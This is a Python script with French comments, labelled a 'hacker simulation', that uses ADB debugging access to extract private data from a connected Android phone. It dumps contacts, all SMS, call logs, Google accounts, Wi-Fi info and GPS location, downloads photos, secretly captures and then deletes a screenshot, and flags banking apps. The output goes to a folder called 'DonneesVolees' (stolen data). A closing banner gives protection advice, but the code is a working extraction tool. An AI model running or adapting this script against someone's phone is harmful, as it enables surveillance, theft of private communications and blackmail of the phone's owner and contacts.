#!/usr/bin/env python3
"""
🔴 EXTRACTION RÉELLE V2 - AVEC DONNÉES VISIBLES
================================================
Extraction COMPLÈTE avec affichage des vraies données
"""

import subprocess
import os
from datetime import datetime

# Configuration
ADB = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
OUTPUT_DIR = r"C:\Users\davis\OneDrive\Bureau\HACKING\DonneesVolees"
DEVICE = None  # Sera défini automatiquement

def run_adb(command, device=None):
    """Exécuter une commande ADB sur un appareil spécifique"""
    try:
        if device:
            cmd = f'"{ADB}" -s {device} {command}'
        else:
            cmd = f'"{ADB}" {command}'
        
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60,
            encoding='utf-8',
            errors='replace'
        )
        return result.stdout.strip()
    except Exception as e:
        return f"Erreur: {e}"

def get_device():
    """Récupérer l'appareil connecté"""
    global DEVICE
    result = run_adb("devices")
    lines = result.split("\n")
    
    for line in lines:
        if "\tdevice" in line:
            DEVICE = line.split("\t")[0]
            return DEVICE
    return None

def create_dirs():
    """Créer les dossiers"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in ["Photos", "Videos", "WhatsApp", "Documents", "Screenshots"]:
        os.makedirs(f"{OUTPUT_DIR}/{folder}", exist_ok=True)

def banner():
    print("\n" + "█"*70)
    print("█" + " "*68 + "█")
    print("█" + "  🔴 EXTRACTION RÉELLE DE DONNÉES - HACKER SIMULATION".center(66) + "█")
    print("█" + " "*68 + "█")
    print("█"*70)
    print(f"\n📅 Date: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")

def section(title, icon="📌"):
    print(f"\n{'='*70}")
    print(f"{icon} {title}")
    print("="*70)

def extract_all():
    """Extraire TOUTES les données avec affichage RÉEL"""
    
    create_dirs()
    
    # 1. INFOS SYSTÈME
    section("1️⃣  INFORMATIONS SYSTÈME - CE QUE LE HACKER DÉCOUVRE EN PREMIER", "🔧")
    
    model = run_adb("shell getprop ro.product.model", DEVICE)
    brand = run_adb("shell getprop ro.product.brand", DEVICE)
    android = run_adb("shell getprop ro.build.version.release", DEVICE)
    serial = run_adb("shell getprop ro.serialno", DEVICE)
    hardware = run_adb("shell getprop ro.hardware", DEVICE)
    screen = run_adb("shell wm size", DEVICE).replace("Physical size: ", "")
    battery = run_adb("shell dumpsys battery", DEVICE)
    
    print(f"""
    ┌────────────────────────────────────────────────────────────┐
    │  📱 MODÈLE:      {model:<40}│
    │  🏷️  MARQUE:      {brand:<40}│
    │  🤖 ANDROID:     {android:<40}│
    │  🔢 N° SÉRIE:    {serial:<40}│
    │  ⚙️  HARDWARE:    {hardware:<40}│
    │  🖥️  ÉCRAN:       {screen:<40}│
    └────────────────────────────────────────────────────────────┘
    """)
    
    # Batterie
    for line in battery.split("\n"):
        if "level" in line:
            level = line.split(":")[-1].strip()
            print(f"    🔋 Batterie: {level}%")
    
    # Stockage
    storage = run_adb("shell df -h /sdcard", DEVICE)
    print("\n    💾 STOCKAGE:")
    for line in storage.split("\n"):
        print(f"       {line}")
    
    # 2. COMPTES GOOGLE
    section("2️⃣  COMPTES GOOGLE - TES IDENTITÉS", "👤")
    
    accounts = run_adb("shell dumpsys account", DEVICE)
    
    google_found = []
    for line in accounts.split("\n"):
        if "Account {" in line and "type=com.google" in line:
            start = line.find("name=") + 5
            end = line.find(",", start)
            if end > start:
                email = line[start:end]
                if "@" in email:
                    google_found.append(email)
    
    if google_found:
        print("\n    🔴 COMPTES GOOGLE TROUVÉS:")
        for email in google_found:
            print(f"       📧 {email}")
    else:
        print("    Aucun compte Google visible (permissions)")
    
    # 3. CONTACTS
    section("3️⃣  CONTACTS - TON CARNET D'ADRESSES", "📇")
    
    contacts = run_adb("shell content query --uri content://contacts/phones", DEVICE)
    
    contact_count = 0
    print("\n    📋 CONTACTS EXTRAITS:")
    for line in contacts.split("\n"):
        if "Row:" in line:
            contact_count += 1
        if contact_count <= 10 and "display_name" in line:
            # Nettoyer et afficher
            clean = line.replace("Row: ", "").strip()
            print(f"       {contact_count}. {clean[:60]}")
    
    print(f"\n    📊 TOTAL: {contact_count} contacts dans ton téléphone!")
    
    # Sauvegarder
    with open(f"{OUTPUT_DIR}/contacts_complet.txt", "w", encoding="utf-8") as f:
        f.write(contacts)
    print(f"    💾 Sauvegardé: contacts_complet.txt")
    
    # 4. SMS
    section("4️⃣  SMS - TES MESSAGES PRIVÉS", "💬")
    
    sms = run_adb('shell content query --uri content://sms --projection "address,body,date" --sort "date DESC LIMIT 10"', DEVICE)
    
    sms_count = 0
    print("\n    📱 DERNIERS SMS:")
    for line in sms.split("\n"):
        if "Row:" in line or "address=" in line:
            sms_count += 1
            if sms_count <= 5:
                # Tronquer pour affichage
                display = line[:70] + "..." if len(line) > 70 else line
                print(f"       💬 {display}")
    
    # Sauvegarder tous les SMS
    all_sms = run_adb('shell content query --uri content://sms', DEVICE)
    sms_total = all_sms.count("Row:")
    
    with open(f"{OUTPUT_DIR}/sms_complet.txt", "w", encoding="utf-8") as f:
        f.write(all_sms)
    
    print(f"\n    📊 TOTAL: {sms_total} SMS extraits!")
    print(f"    💾 Sauvegardé: sms_complet.txt")
    
    # 5. HISTORIQUE APPELS
    section("5️⃣  HISTORIQUE APPELS - QUI TU CONTACTES", "📞")
    
    calls = run_adb('shell content query --uri content://call_log/calls --projection "number,name,duration,date,type" --sort "date DESC LIMIT 20"', DEVICE)
    
    call_count = 0
    print("\n    📞 DERNIERS APPELS:")
    for line in calls.split("\n"):
        if "Row:" in line or "number=" in line:
            call_count += 1
            if call_count <= 8:
                display = line[:65] + "..." if len(line) > 65 else line
                print(f"       📞 {display}")
    
    # Sauvegarder tout
    all_calls = run_adb('shell content query --uri content://call_log/calls', DEVICE)
    calls_total = all_calls.count("Row:")
    
    with open(f"{OUTPUT_DIR}/appels_complet.txt", "w", encoding="utf-8") as f:
        f.write(all_calls)
    
    print(f"\n    📊 TOTAL: {calls_total} appels dans l'historique!")
    print(f"    💾 Sauvegardé: appels_complet.txt")
    
    # 6. PHOTOS
    section("6️⃣  PHOTOS - TES IMAGES PERSONNELLES", "📷")
    
    # DCIM Camera
    photos_dcim = run_adb("shell ls -la /sdcard/DCIM/Camera/ 2>/dev/null", DEVICE)
    
    photo_list = []
    print("\n    📷 PHOTOS DANS DCIM/Camera:")
    for line in photos_dcim.split("\n"):
        if ".jpg" in line.lower() or ".png" in line.lower():
            parts = line.split()
            if parts:
                name = parts[-1]
                size = parts[4] if len(parts) > 4 else "?"
                photo_list.append(name)
                if len(photo_list) <= 10:
                    print(f"       📷 {name} ({size} bytes)")
    
    print(f"\n    📊 Photos dans Camera: {len(photo_list)}")
    
    # Compter toutes les images
    all_images = run_adb("shell find /sdcard -name '*.jpg' 2>/dev/null", DEVICE)
    total_jpg = len([l for l in all_images.split("\n") if l.strip()])
    
    all_png = run_adb("shell find /sdcard -name '*.png' 2>/dev/null", DEVICE)
    total_png = len([l for l in all_png.split("\n") if l.strip()])
    
    print(f"    📊 Total JPG: {total_jpg}")
    print(f"    📊 Total PNG: {total_png}")
    print(f"    📊 TOTAL IMAGES: {total_jpg + total_png}")
    
    # Télécharger quelques photos
    print("\n    ⬇️  Téléchargement d'échantillons...")
    if photo_list:
        for i, photo in enumerate(photo_list[:3]):
            run_adb(f'pull "/sdcard/DCIM/Camera/{photo}" "{OUTPUT_DIR}/Photos/{photo}"', DEVICE)
            if os.path.exists(f"{OUTPUT_DIR}/Photos/{photo}"):
                print(f"       ✅ {photo} téléchargée!")
    
    # 7. VIDÉOS
    section("7️⃣  VIDÉOS", "🎥")
    
    videos = run_adb("shell ls -la /sdcard/DCIM/Camera/*.mp4 2>/dev/null", DEVICE)
    vid_count = len([l for l in videos.split("\n") if ".mp4" in l])
    
    tiktok_vids = run_adb("shell ls /sdcard/Movies/TikTok/ 2>/dev/null", DEVICE)
    tiktok_count = len([l for l in tiktok_vids.split("\n") if l.strip()])
    
    print(f"    🎥 Vidéos caméra: {vid_count}")
    print(f"    🎥 Vidéos TikTok: {tiktok_count}")
    
    # 8. WHATSAPP
    section("8️⃣  WHATSAPP - TES CONVERSATIONS", "📱")
    
    wa_base = "/sdcard/Android/media/com.whatsapp/WhatsApp/Media"
    
    # Images
    wa_images = run_adb(f'shell ls "{wa_base}/WhatsApp Images/" 2>/dev/null', DEVICE)
    wa_img_count = len([l for l in wa_images.split("\n") if l.strip()])
    
    # Sent images
    wa_sent = run_adb(f'shell ls "{wa_base}/WhatsApp Images/Sent/" 2>/dev/null', DEVICE)
    wa_sent_count = len([l for l in wa_sent.split("\n") if l.strip()])
    
    # Voice notes
    wa_voice = run_adb(f'shell ls "{wa_base}/WhatsApp Voice Notes/" 2>/dev/null', DEVICE)
    wa_voice_count = len([l for l in wa_voice.split("\n") if l.strip()])
    
    # Videos
    wa_video = run_adb(f'shell ls "{wa_base}/WhatsApp Video/" 2>/dev/null', DEVICE)
    wa_video_count = len([l for l in wa_video.split("\n") if l.strip()])
    
    print(f"""
    📊 DONNÉES WHATSAPP TROUVÉES:
    
       📷 Images reçues: {wa_img_count}
       📤 Images envoyées: {wa_sent_count}
       🎵 Notes vocales: {wa_voice_count}
       🎥 Vidéos: {wa_video_count}
       ─────────────────────
       📊 TOTAL: {wa_img_count + wa_sent_count + wa_voice_count + wa_video_count} fichiers WhatsApp
    """)
    
    # 9. APPLICATIONS
    section("9️⃣  APPLICATIONS INSTALLÉES", "📲")
    
    apps = run_adb("shell pm list packages -3", DEVICE)
    
    app_list = []
    sensitive = []
    banking = []
    social = []
    
    keywords_bank = ['bank', 'pay', 'money', 'wallet', 'cash', 'credit', 'wave', 'orange']
    keywords_social = ['whatsapp', 'facebook', 'instagram', 'tiktok', 'telegram', 'snapchat', 'twitter']
    keywords_secure = ['password', 'auth', 'secure', 'key', 'vault']
    
    for line in apps.split("\n"):
        if "package:" in line:
            pkg = line.replace("package:", "").strip()
            app_list.append(pkg)
            
            pkg_lower = pkg.lower()
            for kw in keywords_bank:
                if kw in pkg_lower:
                    banking.append(pkg)
                    break
            for kw in keywords_social:
                if kw in pkg_lower:
                    social.append(pkg)
                    break
            for kw in keywords_secure:
                if kw in pkg_lower:
                    sensitive.append(pkg)
                    break
    
    print(f"\n    💰 APPLICATIONS BANCAIRES/PAIEMENT:")
    for app in banking[:10]:
        print(f"       💳 {app}")
    
    print(f"\n    📱 APPLICATIONS SOCIALES:")
    for app in social[:10]:
        print(f"       💬 {app}")
    
    print(f"\n    🔐 APPLICATIONS SENSIBLES:")
    for app in sensitive[:10]:
        print(f"       🔒 {app}")
    
    print(f"\n    📊 Total apps: {len(app_list)}")
    
    # Sauvegarder
    with open(f"{OUTPUT_DIR}/applications.txt", "w", encoding="utf-8") as f:
        f.write("=== APPS BANCAIRES ===\n")
        f.write("\n".join(banking))
        f.write("\n\n=== APPS SOCIALES ===\n")
        f.write("\n".join(social))
        f.write("\n\n=== TOUTES LES APPS ===\n")
        f.write("\n".join(app_list))
    
    # 10. WIFI
    section("🔟 RÉSEAUX WIFI", "📶")
    
    wifi = run_adb("shell dumpsys wifi", DEVICE)
    
    ssids = []
    for line in wifi.split("\n"):
        if "SSID:" in line or "mWifiInfo" in line:
            print(f"    📶 {line.strip()[:60]}")
            ssids.append(line)
    
    with open(f"{OUTPUT_DIR}/wifi_info.txt", "w", encoding="utf-8") as f:
        f.write(wifi)
    
    # 11. SCREENSHOT
    section("📸 CAPTURE D'ÉCRAN SECRÈTE", "📸")
    
    print("    📸 Capture de l'écran en cours...")
    run_adb("shell screencap -p /sdcard/screenshot_hack.png", DEVICE)
    run_adb(f'pull /sdcard/screenshot_hack.png "{OUTPUT_DIR}/Screenshots/ecran_capture.png"', DEVICE)
    run_adb("shell rm /sdcard/screenshot_hack.png", DEVICE)
    
    if os.path.exists(f"{OUTPUT_DIR}/Screenshots/ecran_capture.png"):
        size = os.path.getsize(f"{OUTPUT_DIR}/Screenshots/ecran_capture.png")
        print(f"    ✅ Screenshot capturé! ({size} bytes)")
        print(f"    💾 Fichier: {OUTPUT_DIR}/Screenshots/ecran_capture.png")
    
    # 12. LOCALISATION
    section("📍 LOCALISATION GPS", "📍")
    
    location = run_adb("shell dumpsys location", DEVICE)
    
    # Chercher les coordonnées
    for line in location.split("\n"):
        if "last location" in line.lower() or "latitude" in line.lower() or "Location[" in line:
            print(f"    📍 {line.strip()[:70]}")
    
    with open(f"{OUTPUT_DIR}/localisation.txt", "w", encoding="utf-8") as f:
        f.write(location)
    
    # RAPPORT FINAL
    section("📊 RAPPORT FINAL", "🔴")
    
    # Compter fichiers
    total_files = sum([len(files) for _, _, files in os.walk(OUTPUT_DIR)])
    total_size = sum([os.path.getsize(os.path.join(root, file)) 
                      for root, _, files in os.walk(OUTPUT_DIR) 
                      for file in files])
    
    print(f"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                  🔴 RÉSUMÉ DE L'EXTRACTION 🔴                    ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║                                                                  ║
    ║   📱 Téléphone: {model:<46}║
    ║   🤖 Android: {android:<48}║
    ║                                                                  ║
    ║   📇 Contacts extraits: {contact_count:<40}║
    ║   💬 SMS extraits: {sms_total:<45}║
    ║   📞 Appels extraits: {calls_total:<43}║
    ║   📷 Photos trouvées: {total_jpg + total_png:<43}║
    ║   📱 Fichiers WhatsApp: {wa_img_count + wa_sent_count + wa_voice_count + wa_video_count:<40}║
    ║   📲 Applications: {len(app_list):<45}║
    ║                                                                  ║
    ║   💾 Fichiers sauvegardés: {total_files:<36}║
    ║   📁 Taille totale: {total_size:,} bytes{' '*28}║
    ║                                                                  ║
    ║   📂 DOSSIER: {OUTPUT_DIR:<48}║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    print("""
    🚨🚨🚨 ATTENTION - CE QU'UN HACKER PEUT FAIRE 🚨🚨🚨
    
    Avec ces données, un hacker peut:
    
    ❌ Usurper ton identité (nom, contacts, photos)
    ❌ Accéder à tes comptes bancaires (si apps installées)
    ❌ Lire TOUS tes messages privés (WhatsApp, SMS)
    ❌ Te faire chanter avec tes photos/vidéos
    ❌ Suivre tes déplacements (GPS)
    ❌ Contacter tes proches pour les arnaquer
    ❌ Récupérer tes mots de passe enregistrés
    
    🛡️ COMMENT TE PROTÉGER:
    
    ✅ Désactive le débogage USB maintenant!
    ✅ Ne connecte jamais ton téléphone à un PC inconnu
    ✅ Active le chiffrement du téléphone
    ✅ Utilise un mot de passe fort
    ✅ Vérifie régulièrement les appareils autorisés
    """)
    
    # Ouvrir le dossier
    print(f"\n📂 Ouverture du dossier des données volées...")
    os.startfile(OUTPUT_DIR)

def main():
    banner()
    
    print("\n🔍 Connexion au téléphone...")
    device = get_device()
    
    if not device:
        print("""
        ❌ Aucun téléphone connecté!
        
        Pour connecter ton téléphone:
        1. Sur le téléphone: Paramètres → Options développeur
        2. Active "Débogage USB" ou "Débogage WiFi"
        3. Si WiFi: Appuie sur "Associer l'appareil avec un code"
        4. Note l'IP:Port et le code d'association
        """)
        return
    
    print(f"✅ Téléphone connecté: {device}")
    print("\n⚠️  EXTRACTION EN COURS... NE TOUCHE PAS AU TÉLÉPHONE!\n")
    
    extract_all()
    
    print("\n" + "="*70)
    print("✅ EXTRACTION TERMINÉE!")
    print("="*70)

if __name__ == "__main__":
    main()
